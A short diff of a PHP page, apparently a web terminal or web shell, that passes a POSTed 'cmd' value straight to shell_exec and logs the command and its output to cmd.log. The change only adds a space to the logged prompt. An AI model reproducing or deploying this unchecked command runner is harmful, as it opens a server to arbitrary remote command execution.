@@ -166,7 +166,7 @@ position: relative;
     if(isset($_POST['SendCMD'])) {
         $logFile = "cmd.log";
         $fh = fopen($logFile, 'a');
-        $stringData = "root@" . $hostname . ":" . "{$_POST['cmd']}\n" . shell_exec("{$_POST['cmd']}\n");
+        $stringData = "root@" . $hostname . ": " . "{$_POST['cmd']}\n" . shell_exec("{$_POST['cmd']}\n");
         fwrite($fh, $stringData);
         fclose($fh);
         $log = file_get_contents('cmd.log');
